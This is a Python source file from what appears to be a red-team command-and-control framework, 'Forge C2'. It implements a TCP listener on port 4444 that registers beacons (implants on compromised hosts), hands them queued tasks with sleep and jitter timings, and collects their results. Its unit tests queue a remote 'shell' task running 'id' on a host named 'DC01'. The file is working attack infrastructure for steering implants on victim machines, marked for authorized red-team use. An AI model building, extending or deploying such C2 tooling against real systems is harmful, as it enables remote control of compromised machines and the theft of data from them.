"""
Forge C2 — TCP Listener
===========================
Raw TCP listener for high-bandwidth C2 communication.

Same length-prefixed binary protocol as the TCP transport.
Best for internal network channels and pivot points.

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import json
import logging
import struct
import time
from dataclasses import dataclass
from typing import Any, Callable

from forge_c2.beacon.beacon_core import Beacon, BeaconRegistry
from forge_c2.beacon.beacon_crypto import BeaconCrypto
from forge_c2.transport.tcp_transport import TCPTransport, TCPConfig

log = logging.getLogger("forge.c2.listener.tcp")


@dataclass
class TCPListenerConfig:
    """Configuration for TCP listener."""
    bind_host: str = "0.0.0.0"
    bind_port: int = 4444


class TCPListener:
    """Raw TCP C2 listener.

    Accepts length-prefixed binary connections from beacons.
    Routes through the same check-in/result protocol as HTTP.

    Usage::

        listener = TCPListener(
            config=TCPListenerConfig(bind_port=4444),
            registry=beacon_registry,
        )
        await listener.start()
    """

    def __init__(
        self,
        config: TCPListenerConfig | None = None,
        registry: BeaconRegistry | None = None,
        crypto: BeaconCrypto | None = None,
        event_bus: Any = None,
    ) -> None:
        self.config = config or TCPListenerConfig()
        self.registry = registry or BeaconRegistry()
        self.crypto = crypto or BeaconCrypto()
        self.event_bus = event_bus

        self._transport = TCPTransport(role="server")
        self._transport._client_handler = self._handle_beacon_message

        self._running: bool = False
        self._started_at: float = 0.0
        self._task: asyncio.Task | None = None

    async def start(self) -> None:
        """Start the TCP listener."""
        self._running = True
        self._started_at = time.time()

        connected = await self._transport.connect(
            self.config.bind_host, self.config.bind_port,
        )

        if not connected:
            log.error("TCP listener failed to start on %s:%d",
                      self.config.bind_host, self.config.bind_port)
            return

        log.info("═══ TCP LISTENER ONLINE ═══")
        log.info("Bind: %s:%d", self.config.bind_host, self.config.bind_port)

        self._task = asyncio.create_task(
            self._transport.serve_forever(self._handle_beacon_message),
            name="tcp_listener",
        )

    async def stop(self) -> None:
        """Stop the TCP listener."""
        self._running = False
        await self._transport.disconnect()
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass
        log.info("TCP listener stopped")

    async def _handle_beacon_message(self, payload: bytes) -> bytes:
        """Handle a length-prefixed beacon message.

        Routes to register/checkin/result based on content.
        Returns response bytes.
        """
        try:
            data = json.loads(payload)
        except (json.JSONDecodeError, UnicodeDecodeError):
            return json.dumps({"error": "parse_error"}).encode()

        # Route by content
        beacon_id = data.get("beacon_id", "")
        cmd = data.get("cmd", "")

        if cmd == "register" or "hostname" in data:
            return self._handle_register(data)
        elif cmd == "result" or "task_id" in data:
            return self._handle_result(data)
        else:
            return self._handle_checkin(data)

    def _handle_register(self, data: dict[str, Any]) -> bytes:
        """Register beacon over TCP."""
        beacon = self.registry.register(metadata=data, transport="tcp")
        log.info("TCP BEACON REGISTERED: %s (hostname=%s)",
                 beacon.beacon_id, beacon.metadata.hostname)

        return json.dumps({
            "beacon_id": beacon.beacon_id,
            "sleep": beacon.sleep_seconds,
            "jitter": beacon.jitter_pct,
        }).encode()

    def _handle_checkin(self, data: dict[str, Any]) -> bytes:
        """Handle TCP check-in."""
        beacon_id = data.get("beacon_id", "")
        beacon = self.registry.get(beacon_id)
        if not beacon:
            return json.dumps({"error": "unknown_beacon"}).encode()

        pending = beacon.checkin()
        return json.dumps({
            "beacon_id": beacon_id,
            "tasks": [t.to_dict() for t in pending],
            "sleep": beacon.sleep_seconds,
            "jitter": beacon.jitter_pct,
        }).encode()

    def _handle_result(self, data: dict[str, Any]) -> bytes:
        """Handle task result over TCP."""
        beacon_id = data.get("beacon_id", "")
        task_id = data.get("task_id", "")
        result = data.get("result", "")
        success = data.get("success", True)

        beacon = self.registry.get(beacon_id)
        if not beacon:
            return json.dumps({"error": "unknown_beacon"}).encode()

        beacon.complete_task(task_id, result=result, success=success)
        return json.dumps({"status": "ok"}).encode()

    def summary(self) -> dict[str, Any]:
        uptime = time.time() - self._started_at if self._started_at else 0
        return {
            "type": "tcp",
            "bind": f"{self.config.bind_host}:{self.config.bind_port}",
            "running": self._running,
            "uptime_seconds": round(uptime, 1),
            "transport_stats": self._transport.stats.to_dict(),
        }


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestTCPListener:
    """Tests for TCP listener."""

    def test_init(self) -> None:
        listener = TCPListener()
        assert listener.config.bind_port == 4444

    def test_handle_register(self) -> None:
        listener = TCPListener()
        response = listener._handle_register({"hostname": "WS01", "username": "user"})
        data = json.loads(response)
        assert "beacon_id" in data

    def test_handle_checkin_unknown(self) -> None:
        listener = TCPListener()
        response = listener._handle_checkin({"beacon_id": "fake"})
        data = json.loads(response)
        assert "error" in data

    def test_handle_result(self) -> None:
        listener = TCPListener()
        # Register first
        reg = json.loads(listener._handle_register({"hostname": "DC01"}))
        beacon_id = reg["beacon_id"]
        beacon = listener.registry.get(beacon_id)
        beacon.checkin()
        task = beacon.queue_task("shell", cmd="id")

        result = json.loads(listener._handle_result({
            "beacon_id": beacon_id,
            "task_id": task.task_id,
            "result": "root",
            "success": True,
        }))
        assert result["status"] == "ok"
